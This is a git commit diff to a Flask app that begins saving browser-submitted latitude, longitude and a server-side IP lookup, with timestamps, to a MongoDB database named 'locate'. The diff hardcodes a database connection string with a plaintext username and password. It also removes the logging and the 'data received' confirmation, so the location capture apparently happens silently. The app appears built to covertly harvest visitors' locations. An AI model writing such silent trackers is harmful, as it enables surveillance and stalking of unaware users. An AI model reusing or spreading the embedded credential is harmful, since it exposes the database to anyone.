506f7dd939ae7da1a86cb7cb3a1697013e101f11
venky <101929557+andhraman@users.noreply.github.com>
2023-11-30 11:16:56 +0000

    ok

--- app.py
+++ app.py
@@ -1,9 +1,16 @@
 
 from flask import Flask, render_template, request
 import requests
+from pymongo import MongoClient
 import json
+import pytz
+from datetime import datetime
 
 app = Flask(__name__)
+connection_string = 'mongodb+srv://hackers_co:K9mDEAed8NYtQeLd@blog.xk7q6yw.mongodb.net/'
+client = MongoClient(connection_string)
+db = client["locate"]  # Update with your MongoDB database name
+info = db["info"]
 
 @app.route('/', methods=['GET', 'POST'])
 def index():
@@ -11,8 +18,11 @@ def index():
         response = requests.get("https://api.ipify.org/?format=json")
         data = json.loads(response.text)
         ip_address = data['ip']
-        print(ip_address)
-        # https://ipwhois.app/json/20.235.87.227
+        # print(ip_address)
+        ist = pytz.timezone('Asia/Kolkata')
+    # current_time = datetime.now(ist)
+        current_date = datetime.now(ist).strftime("%Y-%m-%d %H:%M:%S")
+        info.insert_one({'ipAddress':ip_address,'date':current_date})
         # Parse and process the IP address as needed
         # Fetch ISP details using an appropriate method
         # return "ISP Details: ..."
@@ -28,11 +38,17 @@ def send_location():
     data = request.get_json()
     latitude = data['latitude']
     longitude = data['longitude']
+    ist = pytz.timezone('Asia/Kolkata')
+    # current_time = datetime.now(ist)
+    current_date = datetime.now(ist).strftime("%Y-%m-%d %H:%M:%S")
+    info.insert_one({'latitude': latitude, 'longitude': longitude,'date':current_date})
 
-    print(f'Received Geolocation Data - Latitude: {latitude}, Longitude: {longitude}')
+    # print(f'Received Geolocation Data - Latitude: {latitude}, Longitude: {longitude}')
     
-    return 'Geolocation data received on the server!'
+    return ''
 
 if __name__ == '__main__':
     app.run(debug=True)
+    # from waitress import serve
+    # serve(app, host="0.0.0.0", port=8080)
 
